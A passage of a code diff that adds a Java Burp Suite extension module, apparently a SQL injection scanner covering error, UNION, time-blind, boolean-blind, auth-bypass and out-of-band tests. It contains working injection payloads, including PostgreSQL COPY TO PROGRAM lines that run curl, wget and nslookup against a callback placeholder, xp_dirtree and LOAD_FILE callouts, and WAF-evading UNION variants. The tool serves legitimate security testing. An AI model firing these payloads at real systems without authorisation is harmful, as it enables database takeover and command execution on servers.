+        oob.put("PostgreSQL", new String[]{
+                // COPY TO PROGRAM (superuser)
+                "'; COPY (SELECT '') TO PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
+                "'; COPY (SELECT '') TO PROGRAM 'curl http://COLLAB_PLACEHOLDER/'-- -",
+                "'; COPY (SELECT '') TO PROGRAM 'wget http://COLLAB_PLACEHOLDER/'-- -",
+                // dblink_connect (if extension installed)
+                "'||(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))||'",
+                "' AND 1=(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))-- -",
+                // Large object export (lo_export + COPY)
+                "'; SELECT lo_export(lo_creat(-1), '\\\\COLLAB_PLACEHOLDER\\a')-- -",
+                // DNS via inet_client_addr
+                "'; DO $$ BEGIN PERFORM dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'); EXCEPTION WHEN OTHERS THEN END $$-- -",
+                // PG extensions - xml
+                "'; SELECT query_to_xml('SELECT 1',true,true,'http://COLLAB_PLACEHOLDER/')-- -",
+        });
+        oob.put("SQLite", new String[]{
+                // SQLite doesn't have native OOB, but ATTACH can be used
+                "'; ATTACH DATABASE '\\\\COLLAB_PLACEHOLDER\\a' AS loot-- -",
+                // Load extension (if enabled)
+                "'; SELECT load_extension('\\\\COLLAB_PLACEHOLDER\\a')-- -",
+        });
+        // DB-agnostic OOB via stacked queries (try common DNS/HTTP exfil for unknown DB)
+        oob.put("Generic", new String[]{
+                "'; EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
+                "' AND LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
+                "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER'))||'",
+                "'; COPY (SELECT '') TO PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
+        });
+        OOB_PAYLOADS = Collections.unmodifiableMap(oob);
+    }
+
+    private static final String UNION_MARKER = "xXsSqLiXx";
+
+    @Override
+    public String getId() { return "sqli-detector"; }
+
+    @Override
+    public String getName() { return "Smart SQLi Detector"; }
+
+    @Override
+    public String getDescription() {
+        return "SQL injection detection: error-based, union-based, time-blind, boolean-blind, and OOB (Collaborator).";
+    }
+
+    @Override
+    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }
+
+    @Override
+    public boolean isPassive() { return false; }
+
+    @Override
+    public void initialize(MontoyaApi api, ModuleConfig config) {
+        this.api = api;
+        this.config = config;
+    }
+
+    /**
+     * Inject external dependencies from the framework.
+     */
+    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
+                                 CollaboratorManager collaboratorManager) {
+        this.dedup = dedup;
+        this.findingsStore = findingsStore;
+        this.collaboratorManager = collaboratorManager;
+    }
+
+    @Override
+    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
+        // Extract parameters from the request
+        HttpRequest request = requestResponse.request();
+        String urlPath = extractPath(request.url());
+        List<InjectionPoint> injectionPoints = extractInjectionPoints(request);
+
+        for (InjectionPoint ip : injectionPoints) {
+            String dedupKey = "sqli:" + urlPath + ":" + ip.name;
+            if (tested.containsKey(dedupKey)) continue;
+
+            try {
+                testParameter(requestResponse, ip, urlPath);
+                tested.put(dedupKey, Boolean.TRUE);
+            } catch (Exception e) {
+                api.logging().logToError("SQLi test error on " + ip.name + ": " + e.getMessage());
+            }
+        }
+
+        return Collections.emptyList(); // Findings are added async to FindingsStore
+    }
+
+    private void testParameter(HttpRequestResponse original, InjectionPoint ip, String urlPath) {
+        try {
+            // Phase 1: Baseline (3 measurements, use max to reduce false positives)
+            TimedResult baselineTimedResult = measureResponseTime(original, ip, ip.originalValue);
+            HttpRequestResponse baseline = baselineTimedResult.response;
+            if (baseline == null || baseline.response() == null) return;
+
+            long baselineTime = baselineTimedResult.elapsedMs;
+            TimedResult b2 = measureResponseTime(original, ip, ip.originalValue);
+            TimedResult b3 = measureResponseTime(original, ip, ip.originalValue);
+            baselineTime = Math.max(baselineTime, Math.max(
+                    b2.response != null ? b2.elapsedMs : 0,
+                    b3.response != null ? b3.elapsedMs : 0));
+
+            int baselineLength = baseline.response().bodyToString().length();
+            int baselineStatus = baseline.response().statusCode();
+            String baselineBody = baseline.response().bodyToString();
+
+            // Phase 2: Auth bypass (if enabled and looks like a login param)
+            if (config.getBool("sqli.authBypass.enabled", true)) {
+                testAuthBypass(original, ip, baselineStatus, baselineLength, baselineBody);
+            }
+
+            // Phase 3: Error-based (if enabled)
+            if (config.getBool("sqli.error.enabled", true)) {
+                testErrorBased(original, ip, baselineBody);
+            }
+
+            // Phase 3: Union-based (if enabled)
+            if (config.getBool("sqli.union.enabled", true)) {
+                testUnionBased(original, ip, baselineLength, baselineStatus, baselineBody);
+            }
+
+            // Phase 4: Time-based blind (if enabled)
+            if (config.getBool("sqli.time.enabled", true)) {
+                testTimeBased(original, ip, baselineTime);
+            }
+
+            // Phase 5: Boolean-based blind (if enabled)
+            if (config.getBool("sqli.boolean.enabled", true)) {
+                testBooleanBased(original, ip, baselineLength, baselineStatus, baselineBody);
+            }
+
+            // Phase 6: OOB via Collaborator (if enabled and available)
+            if (config.getBool("sqli.oob.enabled", true) && collaboratorManager != null && collaboratorManager.isAvailable()) {
+                testOob(original, ip);
+            }
+
+        } catch (Exception e) {
+            api.logging().logToError("SQLi test error for " + ip.name + ": " + e.getMessage());
+        }
+    }
+
+    // ==================== PHASE 2: ERROR-BASED ====================
+
+    private void testErrorBased(HttpRequestResponse original, InjectionPoint ip, String baselineBody) {
+        for (String payload : ERROR_PAYLOADS) {
+            try {
+    
+                HttpRequestResponse result = sendWithPayload(original, ip, payload);
+                if (result == null || result.response() == null) continue;
+
+                String responseBody = result.response().bodyToString();
+
+                // Check for SQL error signatures
+                for (Map.Entry<String, List<Pattern>> entry : ERROR_PATTERNS.entrySet()) {
+                    String dbType = entry.getKey();
+                    for (Pattern pattern : entry.getValue()) {
+                        Matcher m = pattern.matcher(responseBody);
+                        if (m.find() && !pattern.matcher(baselineBody).find()) {
+                            String evidence = m.group();
+                            findingsStore.addFinding(Finding.builder("sqli-detector",
+                                            "SQL Injection (Error-Based) - " + dbType,
+                                            Severity.HIGH, Confidence.FIRM)
+                                    .url(original.request().url())
+                                    .parameter(ip.name)
+                                    .evidence("Payload: " + payload + " | Error: " + evidence)
+                                    .description("Error-based SQL injection detected. DB type: " + dbType
+                                            + ". Parameter '" + ip.name + "' triggered a SQL error.")
+                                    .requestResponse(result)
+                                    .build());
+                            return; // Found error-based, skip remaining payloads
+                        }
+                    }
+                }
+
+                perHostDelay();
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return;
+            }
+        }
+    }
+
+    // ==================== PHASE 2: AUTH BYPASS ====================
+
+    private void testAuthBypass(HttpRequestResponse original, InjectionPoint ip,
+                                 int baselineStatus, int baselineLength, String baselineBody) {
+        // Only test parameters that look like login/username fields, or any parameter in a POST
+        // request that has a password-like sibling parameter
+        boolean isLoginParam = isLoginParameter(ip, original.request());
+        if (!isLoginParam) return;
+
+        api.logging().logToOutput("[SQLi] Auth bypass: testing param '" + ip.name + "' (login parameter detected)");
+
+        String baselineLower = baselineBody.toLowerCase();
+
+        // Check if baseline looks like a failed login (has failure keywords or is a login page)
+        boolean baselineHasFailure = false;
+        for (String keyword : FAILURE_KEYWORDS) {
+            if (baselineLower.contains(keyword)) {
+                baselineHasFailure = true;
+                break;
+            }
+        }
+
+        for (String payloadTemplate : AUTH_BYPASS_PAYLOADS) {
+            try {
+                String payload = payloadTemplate.replace("ORIGINAL_VALUE", ip.originalValue);
+
+                HttpRequestResponse result = sendWithPayload(original, ip, payload);
+                if (result == null || result.response() == null) continue;
+
+                int resultStatus = result.response().statusCode();
+                int resultLength = result.response().bodyToString().length();
+                String resultBody = result.response().bodyToString();
+                String resultLower = resultBody.toLowerCase();
+
+                // Detection signals for successful auth bypass
+                List<String> signals = new ArrayList<>();
+
+                // Signal 1: Status code changed to redirect (302, 303) — classic login redirect
+                if ((baselineStatus == 200 || baselineStatus == 401 || baselineStatus == 403)
+                        && (resultStatus == 302 || resultStatus == 303)) {
+                    String location = "";
+                    for (var h : result.response().headers()) {
+                        if (h.name().equalsIgnoreCase("Location")) {
+                            location = h.value();
+                            break;
+                        }
+                    }
+                    signals.add("Redirect: HTTP " + baselineStatus + " → " + resultStatus
+                            + (location.isEmpty() ? "" : " (Location: " + location + ")"));
+                }
+
+                // Signal 2: Status code changed from error to success
+                if ((baselineStatus == 401 || baselineStatus == 403) && resultStatus == 200) {
+                    signals.add("Status change: HTTP " + baselineStatus + " → 200 OK");
+                }
+
+                // Signal 3: New Set-Cookie header appeared (new session created)
+                boolean baselineHasCookie = false;
+                boolean resultHasCookie = false;
+                for (var h : original.response() != null ? original.response().headers() : List.<burp.api.montoya.http.message.HttpHeader>of()) {
+                    if (h.name().equalsIgnoreCase("Set-Cookie")) { baselineHasCookie = true; break; }
+                }
+                for (var h : result.response().headers()) {
+                    if (h.name().equalsIgnoreCase("Set-Cookie")) { resultHasCookie = true; break; }
+                }
+                if (resultHasCookie && !baselineHasCookie) {
+                    signals.add("New session cookie set (Set-Cookie header appeared)");
+                }
+
+                // Signal 4: Success keywords appeared in response
+                for (String keyword : SUCCESS_KEYWORDS) {
+                    if (resultLower.contains(keyword) && !baselineLower.contains(keyword)) {
+                        signals.add("Success keyword appeared: '" + keyword + "'");
+                        break;
+                    }
+                }
+
+                // Signal 5: Failure keywords disappeared from response
+                if (baselineHasFailure) {
+                    boolean stillHasFailure = false;
+                    for (String keyword : FAILURE_KEYWORDS) {
+                        if (resultLower.contains(keyword)) {
+                            stillHasFailure = true;
+                            break;
+                        }
+                    }
+                    if (!stillHasFailure) {
+                        signals.add("Login failure message disappeared");
+                    }
+                }
+
+                // Signal 6: Significant body length change (more than 30% different)
+                if (baselineLength > 0) {
+                    double ratio = Math.abs(resultLength - baselineLength) / (double) baselineLength;
+                    if (ratio > 0.3 && Math.abs(resultLength - baselineLength) > 200) {
+                        signals.add("Body length changed significantly: " + baselineLength + " → " + resultLength
+                                + " (" + Math.round(ratio * 100) + "% difference)");
+                    }
+                }
+
+                // Report if we have strong signals
+                if (signals.size() >= 2) {
+                    // Multiple signals — high confidence
+                    findingsStore.addFinding(Finding.builder("sqli-detector",
+                                    "SQL Injection — Authentication Bypass",
+                                    Severity.CRITICAL, Confidence.FIRM)
+                            .url(original.request().url())
+                            .parameter(ip.name)
+                            .evidence("Payload: " + payload + "\n" + String.join("\n", signals))
+                            .description("Authentication bypass via SQL injection. The payload '" + payload
+                                    + "' in parameter '" + ip.name + "' caused a different response indicating "
+                                    + "successful login. The SQL comment (--) likely terminated the password check "
+                                    + "in the query (e.g., SELECT * FROM users WHERE username='" + payload
+                                    + "' AND password='...' → password check is commented out).")
+                            .remediation("Use parameterized queries (prepared statements) instead of string "
+                                    + "concatenation in SQL queries. Never build SQL queries by concatenating "
+                                    + "user input directly.")
+                            .requestResponse(result)
+                            .build());
+                    api.logging().logToOutput("[SQLi] Auth bypass CONFIRMED for param '" + ip.name
+                            + "' with payload: " + payload + " | Signals: " + signals);
+                    return;
+                } else if (signals.size() == 1) {
+                    // Single signal — tentative
+                    findingsStore.addFinding(Finding.builder("sqli-detector",
+                                    "Potential SQL Injection — Authentication Bypass",
+                                    Severity.HIGH, Confidence.TENTATIVE)
+                            .url(original.request().url())
+                            .parameter(ip.name)
+                            .evidence("Payload: " + payload + "\n" + signals.get(0))
+                            .description("Possible authentication bypass via SQL injection. The payload '"
+                                    + payload + "' in parameter '" + ip.name + "' caused a response change "
+                                    + "that may indicate successful login bypass. Manual verification recommended.")
+                            .remediation("Use parameterized queries (prepared statements) instead of string "
+                                    + "concatenation in SQL queries.")
+                            .requestResponse(result)
+                            .build());
+                    api.logging().logToOutput("[SQLi] Auth bypass possible for param '" + ip.name
+                            + "' with payload: " + payload + " | Signal: " + signals.get(0));
+                    return;
+                }
+
+                perHostDelay();
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return;
+            }
+        }
+    }
+
+    /**
+     * Determines if a parameter looks like a login/username field.
+     * Checks the parameter name and whether a password-like sibling parameter exists.
+     */
+    private boolean isLoginParameter(InjectionPoint ip, HttpRequest request) {
+        String nameLower = ip.name.toLowerCase().replaceAll("[_\\-.]", "");
+
+        // Direct match on parameter name
+        for (String loginName : LOGIN_PARAM_NAMES) {
+            if (nameLower.equals(loginName.replace("_", ""))) {
+                return true;
+            }
+        }
+
+        // Check if there's a password-like sibling parameter (strong hint this is a login form)
+        boolean hasPasswordSibling = false;
+        for (var param : request.parameters()) {
+            String pName = param.name().toLowerCase().replaceAll("[_\\-.]", "");
+            if (pName.contains("password") || pName.contains("passwd") || pName.contains("pass")
+                    || pName.equals("pw") || pName.equals("pwd")) {
+                hasPasswordSibling = true;
+                break;
+            }
+        }
+
+        // Also check JSON body for password fields
+        if (!hasPasswordSibling) {
+            String contentType = "";
+            for (var h : request.headers()) {
+                if (h.name().equalsIgnoreCase("Content-Type")) {
+                    contentType = h.value();
+                    break;
+                }
+            }
+            if (contentType.contains("application/json")) {
+                String body = request.bodyToString();
+                if (body != null) {
+                    String bodyLower = body.toLowerCase();
+                    hasPasswordSibling = bodyLower.contains("\"password\"") || bodyLower.contains("\"passwd\"")
+                            || bodyLower.contains("\"pass\"") || bodyLower.contains("\"pwd\"");
+                }
+            }
+        }
+
+        // If there's a password sibling, any non-password text field could be the username
+        if (hasPasswordSibling) {
+            String pName = ip.name.toLowerCase();
+            return !pName.contains("password") && !pName.contains("passwd")
+                    && !pName.contains("pass") && !pName.equals("pw") && !pName.equals("pwd")
+                    && !pName.contains("csrf") && !pName.contains("token");
+        }
+
+        return false;
+    }
+
+    // ==================== PHASE 3: UNION-BASED ====================
+
+    private void testUnionBased(HttpRequestResponse original, InjectionPoint ip,
+                                 int baselineLength, int baselineStatus, String baselineBody) {
+        int maxColumns = config.getInt("sqli.union.maxColumns", 30);
+        int anomalyThreshold = config.getInt("sqli.union.anomalyThreshold", 50);
+
+        // Step 1: Detect column count via ORDER BY
+        int columnCount = -1;
+        String quoteChar = "'";
+        HttpRequestResponse lastOrderByResult = null;
+
+        for (String q : new String[]{"'", "\"", ""}) {
+            int lastGood = 0;
+            for (int i = 1; i <= maxColumns; i++) {
+                try {
+        
+                    String payload = q.isEmpty()
+                            ? ip.originalValue + " ORDER BY " + i + "-- -"
+                            : ip.originalValue + q + " ORDER BY " + i + "-- -";
+
+                    HttpRequestResponse result = sendWithPayload(original, ip, payload);
+                    if (result == null || result.response() == null) break;
+
+                    int status = result.response().statusCode();
+                    int length = result.response().bodyToString().length();
+
+                    if (status == baselineStatus && Math.abs(length - baselineLength) < anomalyThreshold) {
+                        lastGood = i;
+                        lastOrderByResult = result;
+                    } else {
+                        // Response changed — previous value was the column count
+                        if (lastGood > 0) {
+                            columnCount = lastGood;
+                            quoteChar = q;
+                        }
+                        break;
+                    }
+                    perHostDelay();
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                    return;
+                }
+            }
+            if (columnCount > 0) break;
+        }
+
+        if (columnCount <= 0) return;
+
+        // Report column count detection
+        findingsStore.addFinding(Finding.builder("sqli-detector",
+                        "Potential SQL Injection - Column count detected: " + columnCount,
+                        Severity.MEDIUM, Confidence.TENTATIVE)
+                .url(original.request().url())
+                .parameter(ip.name)
+                .evidence("ORDER BY " + columnCount + " succeeded, ORDER BY " + (columnCount + 1) + " failed")
+                .description("Column count detection via ORDER BY suggests injectable parameter.")
+                .requestResponse(lastOrderByResult)
+                .build());
+
+        // Step 2: UNION SELECT with NULLs (try multiple UNION variants)
+        try {
+
+            String nulls = String.join(",", Collections.nCopies(columnCount, "NULL"));
+
+            // Try multiple UNION variants — some WAFs block UNION SELECT but allow UNION ALL SELECT
+            String[] unionVariants = {
+                    " UNION SELECT ",
+                    " UNION ALL SELECT ",
+                    " UNION/**/SELECT ",
+                    " UNION%0aSELECT ",
+                    "/*!UNION*//*!SELECT*/ ",
+            };
+
+            String unionPayload = null;
+            HttpRequestResponse unionResult = null;
+
+            for (String variant : unionVariants) {
+                String testPayload = quoteChar.isEmpty()
+                        ? ip.originalValue + variant + nulls + "-- -"
+                        : ip.originalValue + quoteChar + variant + nulls + "-- -";
+
+                HttpRequestResponse testResult = sendWithPayload(original, ip, testPayload);
+                if (testResult != null && testResult.response() != null) {
+                    int testStatus = testResult.response().statusCode();
+                    // Accept if status is 200 or matches baseline (WAF would return 403/400)
+                    if (testStatus == 200 || testStatus == baselineStatus) {
+                        unionPayload = testPayload;
+                        unionResult = testResult;
+                        break;
+                    }
+                }
+                perHostDelay();
+            }
+
+            if (unionResult == null) return;
+
+            int unionLength = unionResult.response().bodyToString().length();
+            int unionStatus = unionResult.response().statusCode();
+
+            boolean anomaly = Math.abs(unionLength - baselineLength) > anomalyThreshold
+                    || unionStatus != baselineStatus;
+
+            // Determine which UNION variant worked for subsequent payloads
+            String workingUnion = " UNION SELECT ";
+            if (unionPayload != null) {
+                for (String variant : unionVariants) {
+                    if (unionPayload.contains(variant.trim())) {
+                        workingUnion = variant;
+                        break;
+                    }
+                }
+            }
+
+            // Step 3: Find reflected column
+            int reflectedColumn = -1;
+            for (int col = 0; col < columnCount; col++) {
+
+                String[] cols = new String[columnCount];
+                Arrays.fill(cols, "NULL");
+                cols[col] = "'" + UNION_MARKER + "'";
+
+                String markerPayload = quoteChar.isEmpty()
+                        ? ip.originalValue + workingUnion + String.join(",", cols) + "-- -"
+                        : ip.originalValue + quoteChar + workingUnion + String.join(",", cols) + "-- -";
+
+                HttpRequestResponse markerResult = sendWithPayload(original, ip, markerPayload);
+                if (markerResult != null && markerResult.response() != null) {
+                    if (markerResult.response().bodyToString().contains(UNION_MARKER)) {
+                        reflectedColumn = col + 1;
+
+                        findingsStore.addFinding(Finding.builder("sqli-detector",
+                                        "SQL Injection (Union-Based) - Reflected column " + reflectedColumn,
+                                        Severity.CRITICAL, Confidence.CERTAIN)
+                                .url(original.request().url())
+                                .parameter(ip.name)
+                                .evidence("Column " + reflectedColumn + " of " + columnCount + " is reflected. Marker '" + UNION_MARKER + "' found in response.")
+                                .description("Union-based SQL injection confirmed. Column " + reflectedColumn
+                                        + " is reflected in the response.")
+                                .requestResponse(markerResult)
+                                .build());
+
+                        // Step 4: DB fingerprinting
+                        fingerprintDb(original, ip, columnCount, reflectedColumn, quoteChar, workingUnion);
+                        return;
+                    }
+                }
+                perHostDelay();
+            }
+
+            // Anomaly-only detection (no reflected column found)
+            if (anomaly) {
+                findingsStore.addFinding(Finding.builder("sqli-detector",
+                                "Potential SQL Injection (Union-Based) - Anomaly detected",
+                                Severity.HIGH, Confidence.FIRM)
+                        .url(original.request().url())
+                        .parameter(ip.name)
+                        .evidence("UNION SELECT with " + columnCount + " NULLs caused response change. "
+                                + "Baseline length: " + baselineLength + ", Union length: " + unionLength)
+                        .description("Union injection suspected. Response changed with UNION SELECT but marker not reflected.")
+                        .requestResponse(unionResult)
+                        .build());
+            }
+
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
+    }
+
+    private void fingerprintDb(HttpRequestResponse original, InjectionPoint ip,
+                                int columnCount, int reflectedCol, String quoteChar, String unionVariant) {
+        String[][] dbProbes = {
+                {"MySQL", "version()"},
+                {"MySQL", "database()"},
+                {"MySQL", "user()"},
+                {"MySQL", "@@datadir"},
+                {"PostgreSQL", "version()"},
+                {"PostgreSQL", "current_database()"},
+                {"PostgreSQL", "current_user"},
+                {"MSSQL", "@@version"},
+                {"MSSQL", "DB_NAME()"},
+                {"MSSQL", "SYSTEM_USER"},
+                {"MSSQL", "@@SERVERNAME"},
+                {"Oracle", "banner FROM v$version WHERE ROWNUM=1"},
+                {"Oracle", "user FROM dual"},
+                {"SQLite", "sqlite_version()"},
+        };
+
+        for (String[] probe : dbProbes) {
+            try {
+
+                String[] cols = new String[columnCount];
+                Arrays.fill(cols, "NULL");
+                // Oracle probes with FROM need special handling
+                boolean oracleFrom = probe[1].contains("FROM ");
+                if (oracleFrom) {
+                    cols[reflectedCol - 1] = probe[1].split(" FROM ")[0];
+                } else {
+                    cols[reflectedCol - 1] = probe[1];
+                }
+
+                String selectPart = String.join(",", cols);
+                String fromPart = oracleFrom ? " FROM " + probe[1].split(" FROM ")[1] : "";
+
+                String payload = quoteChar.isEmpty()
+                        ? ip.originalValue + unionVariant + selectPart + fromPart + "-- -"
+                        : ip.originalValue + quoteChar + unionVariant + selectPart + fromPart + "-- -";
+
+                HttpRequestResponse result = sendWithPayload(original, ip, payload);
+                if (result != null && result.response() != null) {
+                    String body = result.response().bodyToString();
+                    // Look for version strings
+                    if (body.contains("MariaDB") || body.matches("(?s).*\\b\\d+\\.\\d+\\.\\d+.*")) {
+                        findingsStore.addFinding(Finding.builder("sqli-detector",
+                                        "Database Fingerprint: " + probe[0],
+                                        Severity.CRITICAL, Confidence.CERTAIN)
+                                .url(original.request().url())
+                                .parameter(ip.name)
+                                .evidence("DB probe " + probe[1] + " returned data")
+                                .description("Database identified as " + probe[0] + " via UNION-based extraction.")
+                                .requestResponse(result)
+                                .build());
+                        return;
+                    }
+                }
+                perHostDelay();
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return;
+            }
+        }
+    }
+
+    // ==================== PHASE 4: TIME-BASED BLIND ====================
+
+    private void testTimeBased(HttpRequestResponse original, InjectionPoint ip, long baselineTime) {
+        int delayThreshold = config.getInt("sqli.time.threshold", 4000);
+
+        for (Map.Entry<String, String[]> entry : TIME_PAYLOADS.entrySet()) {
+            String dbType = entry.getKey();
+            for (String payload : entry.getValue()) {
+                try {
+
+                    TimedResult result1 = measureResponseTime(original, ip, payload);
+
+                    if (result1.elapsedMs >= baselineTime + delayThreshold) {
+                        // Confirm with second attempt
+
+                        TimedResult result2 = measureResponseTime(original, ip, payload);
+
+                        if (result2.elapsedMs >= baselineTime + delayThreshold) {
+                            findingsStore.addFinding(Finding.builder("sqli-detector",
+                                            "SQL Injection (Time-Based Blind) - " + dbType,
+                                            Severity.HIGH, Confidence.FIRM)
+                                    .url(original.request().url())
+                                    .parameter(ip.name)
+                                    .evidence("Payload: " + payload + " | Baseline: " + baselineTime
+                                            + "ms | Attempt 1: " + result1.elapsedMs + "ms | Attempt 2: " + result2.elapsedMs + "ms")
+                                    .description("Time-based blind SQL injection confirmed (2 hits). DB type: " + dbType)
+                                    .requestResponse(result2.response)
+                                    .build());
+                            return;
+                        } else {
+                            findingsStore.addFinding(Finding.builder("sqli-detector",
+                                            "Potential SQL Injection (Time-Based) - " + dbType,
+                                            Severity.MEDIUM, Confidence.TENTATIVE)
+                                    .url(original.request().url())
+                                    .parameter(ip.name)
+                                    .evidence("Payload: " + payload + " | Single hit: " + result1.elapsedMs + "ms (baseline: " + baselineTime + "ms)")
+                                    .description("Single time-delay hit. May be false positive (network latency).")
+                                    .requestResponse(result1.response)
+                                    .build());
+                        }
+                    }
+                    perHostDelay();
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                    return;
+                }
+            }
+        }
+    }
+
+    // ==================== PHASE 5: BOOLEAN-BASED BLIND ====================
+
+    private void testBooleanBased(HttpRequestResponse original, InjectionPoint ip,
+                                   int baselineLength, int baselineStatus, String baselineBody) {
+        for (String[] pair : BOOLEAN_PAIRS) {
+            try {
+    
+                HttpRequestResponse trueResult = sendWithPayload(original, ip, pair[0]);
+                if (trueResult == null || trueResult.response() == null) continue;
+
+    
+                HttpRequestResponse falseResult = sendWithPayload(original, ip, pair[1]);
+                if (falseResult == null || falseResult.response() == null) continue;
+
+                int trueLen = trueResult.response().bodyToString().length();
+                int falseLen = falseResult.response().bodyToString().length();
+                int trueStatus = trueResult.response().statusCode();
+                int falseStatus = falseResult.response().statusCode();
+
+                // True condition should be similar to baseline, false should differ
+                boolean trueMatchesBaseline = Math.abs(trueLen - baselineLength) < 50
+                        && trueStatus == baselineStatus;
+                boolean falseDiffers = Math.abs(falseLen - baselineLength) > 100
+                        || falseStatus != baselineStatus;
+
+                if (trueMatchesBaseline && falseDiffers) {
+                    // Confirmation pass: resend true payload to upgrade TENTATIVE→FIRM
+                    HttpRequestResponse confirmResult = sendWithPayload(original, ip, pair[0]);
+                    boolean confirmed = false;
+                    if (confirmResult != null && confirmResult.response() != null) {
+                        int confirmLen = confirmResult.response().bodyToString().length();
+                        int confirmStatus = confirmResult.response().statusCode();
+                        confirmed = Math.abs(confirmLen - baselineLength) < 50
+                                && confirmStatus == baselineStatus;
+                    }
+
+                    Severity sev = confirmed ? Severity.HIGH : Severity.MEDIUM;
+                    Confidence conf = confirmed ? Confidence.FIRM : Confidence.TENTATIVE;
+                    String title = confirmed
+                            ? "SQL Injection (Boolean-Based Blind) - Confirmed"
+                            : "Potential SQL Injection (Boolean-Based Blind)";
+
+                    findingsStore.addFinding(Finding.builder("sqli-detector", title, sev, conf)
+                            .url(original.request().url())
+                            .parameter(ip.name)
+                            .evidence("True payload: " + pair[0] + " (len=" + trueLen + ", status=" + trueStatus + ")"
+                                    + " | False payload: " + pair[1] + " (len=" + falseLen + ", status=" + falseStatus + ")"
+                                    + " | Baseline: len=" + baselineLength + ", status=" + baselineStatus
+                                    + (confirmed ? " | Confirmation pass: true payload consistent" : ""))
+                            .description("Boolean-based blind SQLi" + (confirmed ? " confirmed" : " indicator")
+                                    + ". True/false conditions produce different responses.")
+                            .requestResponse(trueResult)
+                            .build());
+                    return;
+                }
+                perHostDelay();
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return;
+            }
+        }
+    }
+
+    // ==================== PHASE 6: OOB VIA COLLABORATOR ====================
+
+    private void testOob(HttpRequestResponse original, InjectionPoint ip) {
+        String url = original.request().url();
+
+        for (Map.Entry<String, String[]> entry : OOB_PAYLOADS.entrySet()) {
+            String dbType = entry.getKey();
+            for (String payloadTemplate : entry.getValue()) {
+                try {
+                    // AtomicReference to capture the sent request/response for the finding
+                    AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
+
+                    // Generate unique Collaborator payload for this test
+                    String collabPayload = collaboratorManager.generatePayload(
+                            "sqli-detector", url, ip.name,
+                            "OOB SQLi (" + dbType + ")",
+                            interaction -> {
+                                // Callback when Collaborator interaction is received
+                                findingsStore.addFinding(Finding.builder("sqli-detector",
+                                                "SQL Injection (Out-of-Band) - " + dbType,
+                                                Severity.CRITICAL, Confidence.CERTAIN)
+                                        .url(url)
+                                        .parameter(ip.name)
+                                        .evidence("Collaborator " + interaction.type().name()
+                                                + " interaction received from " + interaction.clientIp()
+                                                + " at " + interaction.timeStamp()
+                                                + " | DB type: " + dbType)
+                                        .description("Out-of-band SQL injection confirmed via Burp Collaborator. "
+                                                + "The server made a " + interaction.type().name()
+                                                + " request to the Collaborator server, proving code execution "
+                                                + "within the SQL query. DB type: " + dbType)
+                                        .requestResponse(sentRequest.get())
+                                        .build());
+                                api.logging().logToOutput("[SQLi OOB] Confirmed! " + interaction.type()
+                                        + " interaction for " + url + " param=" + ip.name + " DB=" + dbType);
+                            }
+                    );
+
+                    if (collabPayload == null) continue;
+
+                    // Replace placeholder with actual Collaborator domain
+                    String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);
+
+
+                    sentRequest.set(sendWithPayload(original, ip, payload));
+
+                    api.logging().logToOutput("[SQLi OOB] Sent " + dbType + " payload to " + url
+                            + " param=" + ip.name + " collab=" + collabPayload);
+
+                    perHostDelay();
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                    return;
+                } catch (Exception e) {
+                    api.logging().logToError("SQLi OOB error: " + e.getMessage());
+                }
+            }
+        }
+    }
+
+    // ==================== HELPER METHODS ====================
+
+    private HttpRequestResponse sendWithPayload(HttpRequestResponse original, InjectionPoint ip, String payload) {
+        try {
+            HttpRequest modified = injectPayload(original.request(), ip, payload);
+            return api.http().sendRequest(modified);
+        } catch (Exception e) {
+            api.logging().logToError("Failed to send request: " + e.getMessage());
+            return null;
+        }
+    }
+
+    /** Result of a timed request, bundling elapsed time and the response together to avoid races. */
+    private static class TimedResult {
+        final long elapsedMs;
+        final HttpRequestResponse response;
+        TimedResult(long elapsedMs, HttpRequestResponse response) {
+            this.elapsedMs = elapsedMs;
+            this.response = response;
+        }
+    }
+
+    private TimedResult measureResponseTime(HttpRequestResponse original, InjectionPoint ip, String payload) {
+        long start = System.currentTimeMillis();
+        HttpRequestResponse response = sendWithPayload(original, ip, payload);
+        long elapsed = System.currentTimeMillis() - start;
+        return new TimedResult(elapsed, response);
+    }
+
+    private HttpRequest injectPayload(HttpRequest request, InjectionPoint ip, String payload) {
+        switch (ip.type) {
+            case QUERY:
+                return request.withUpdatedParameters(
+                        burp.api.montoya.http.message.params.HttpParameter.urlParameter(ip.name,
+                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
+            case BODY:
+                return request.withUpdatedParameters(
+                        burp.api.montoya.http.message.params.HttpParameter.bodyParameter(ip.name,
+                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
+            case COOKIE:
+                return request.withUpdatedParameters(
+                        burp.api.montoya.http.message.params.HttpParameter.cookieParameter(ip.name, payload));
+            case JSON:
+                // Replace value in JSON body, supporting nested dot-notation keys
+                String body = request.bodyToString();
+                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
+                if (ip.name.contains(".")) {
+                    // Nested key — parse, replace, serialize
+                    String newBody = replaceNestedJsonValue(body, ip.name, escaped);
+                    return request.withBody(newBody);
+                } else {
